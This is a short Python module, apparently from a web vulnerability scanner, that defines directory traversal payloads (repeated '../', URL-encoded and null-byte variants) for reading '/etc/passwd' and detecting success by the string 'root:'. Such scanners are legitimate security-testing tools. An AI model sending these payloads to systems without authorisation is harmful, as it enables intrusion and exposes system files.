from Scanner import Scanner

class DirectoryTraversalScanner(Scanner):
    className = 'Directory Traversal'
    payloads = ['/%s', '../'*19 +'%s', './'+'../'*19 +'%s',
            'file%%3a//%s', '....//'*19 +'%s', '..%%2f'*19 +'%s']
    payloads.extend(payload + '%%0' for payload in payloads[:])
    testPayload = 'etc/passwd'
    testSignature = 'root:'
    realPayload = 'etc/passwd'
